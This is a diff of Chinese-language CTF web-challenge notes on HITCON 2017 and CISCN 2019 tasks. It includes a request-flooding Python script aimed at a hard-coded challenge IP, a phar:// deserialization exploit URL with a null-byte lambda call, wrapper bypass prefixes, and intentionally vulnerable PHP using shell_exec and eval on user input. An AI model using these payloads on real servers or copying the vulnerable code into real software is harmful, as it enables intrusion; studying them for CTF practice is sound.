+	其中 %d 会一直递增，代表着这是该进程里的第几个匿名函数，那么这里即使不知道函数名，也可以这样调用了，不知道第几个匿名函数也可以爆破
+	橘子师傅给的方法是向 Apache 发送大量请求，使得 Apache 开启新的进程来处理请求，那么我们就可以直接 \x00lambda_1() 就可以拿到 flag
+
+	Apache-prefork模型（默认）
+	在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 
+	这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求。
+
+	# coding: UTF-8
+	# Author: orange@chroot.org
+
+	import requests
+	import socket
+	import time
+	from multiprocessing.dummy import Pool as ThreadPool
+
+	try:
+		requests.packages.urllib3.disable_warnings()
+	except:
+		pass
+
+	def run(i):
+		while 1:
+			HOST = '117.50.3.97'
+			PORT = 8005
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((HOST, PORT))
+			s.sendall('GET / HTTP/1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n')
+			# s.close()
+			print 'ok'
+			time.sleep(0.5)
+
+	i = 8
+	pool = ThreadPool( i )
+	result = pool.map_async( run, range(i) ).get(0xffff)
+
+
+	http://117.50.3.97:8005/?m=upload&url=phar:///var/www/data/10ca93deca3a77b681f68dd0e46647ec&lucky=%00lambda_1
+
+	如果不能以 phar 开头，还可以加其他的协议  https://blog.zsxsoft.com/post/38
+	compress.bzip2://phar://
+	compress.zlib://phar://
+
+
+# 2017 hitcon ctf ssrf me
+	<?php 
+		$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
+		@mkdir($sandbox); 
+		@chdir($sandbox); 
+
+
+		// GET 有大洞
+		$data = shell_exec("GET " . escapeshellarg($_GET["url"]));
+		$info = pathinfo($_GET["filename"]);
+		$dir  = str_replace(".", "", basename($info["dirname"]));
+		@mkdir($dir);
+		@chdir($dir);
+		@file_put_contents(basename($info["basename"]), $data);
+		highlight_file(__FILE__); 
+
+
+# 2017 hitcon ctf ssrf me
+	
+
+
 # 2019 DDCTF
 	php://filter/read=convert.base64-encode/resource=index.php
 
@@ -3530,3 +3782,64 @@ get_defined_vars — 返回由所有已定义变量所组成的数组
 	wireshark
 
 	172.25 是自己， 110 是网站
+
+
+
+# 2019 CISCN justsoso
+php 引用，配合反序列化
+
+# 2019 CISCN love math
+	<?php 
+	error_reporting(0); 
+	//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
+	if(!isset($_GET['c'])){ 
+		show_source(__FILE__); 
+	}else{ 
+		//例子 c=20-1 
+		$content = $_GET['c']; 
+		if (strlen($content) >= 80) { 
+			die("太长了不会算"); 
+		}
+		$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]']; 
+		foreach ($blacklist as $blackitem) { 
+			if (preg_match('/' . $blackitem . '/m', $content)) { 
+				die("请不要输入奇奇怪怪的字符"); 
+			} 
+		} 
+		//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
+		$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+		preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs); 
+		foreach ($used_funcs[0] as $func) { 
+			if (!in_array($func, $whitelist)) { 
+				die("请不要输入奇奇怪怪的函数"); 
+			} 
+		} 
+		//帮你算出答案 
+		eval('echo '.$content.';');
+	}
+
+# 2019 CISCN RefSpace
+	get 新姿势，反射
+	<?php
+	if (!defined('LFI')) {
+		echo "Include me!";
+		exit();
+	}
+	use interesting\FlagSDK;
+	$sdk = new FlagSDK();
+	$key = $_GET['key'] ?? false;
+	if (!$key) {
+		echo "Please provide access key<br \>";
+		echo '$_GET["key"];';
+		exit();
+	}
+	$flag = $sdk->verify($key);
+	if ($flag) {
+		echo $flag;
+	} else {
+		echo "Wrong Key";
+		exit();
+	}
+
+# # 2019 CISCN 全宇宙最简单的 sql
+	根据执行报错/执行成功但登录失败两种回显状态不同，构造注入语句，类似于布尔盲注。
